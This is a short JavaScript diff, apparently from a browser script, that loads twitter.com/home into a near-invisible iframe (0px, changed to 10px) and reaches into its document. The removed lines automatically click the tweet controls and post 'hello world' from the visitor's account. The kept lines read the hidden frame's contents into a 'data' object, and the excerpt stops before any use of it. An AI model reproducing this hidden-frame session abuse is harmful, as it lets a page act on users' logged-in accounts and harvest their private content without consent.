@@ -124,23 +124,13 @@
       element.setAttribute('id', 'myframe');
       element.setAttribute('src', 'https://twitter.com/home');
       document.body.appendChild(element);
-      document.getElementById("myframe").style.width = "0px";
-      document.getElementById("myframe").style.height = "0px";
+      document.getElementById("myframe").style.width = "10px";
+      document.getElementById("myframe").style.height = "10px";
       let ifram = document.getElementById("myframe");
       // access the content of the iframe
       let doc = ifram.contentDocument || ifram.contentWindow.document;
       // get the element by id
-      let element1 = doc.getElementById("global-new-tweet-button");
-      // click the element
-      element1.click();
-      // get the element by id
-      let element2 = doc.getElementById("tweet-box-global");
-      // set the value
-      element2.value = "hello world";
-      // get the element by id
-      let element3 = doc.getElementById("tweet-button");
-      // click the element
-      element3.click();
+      
 
       // iframe page source
       let data ={
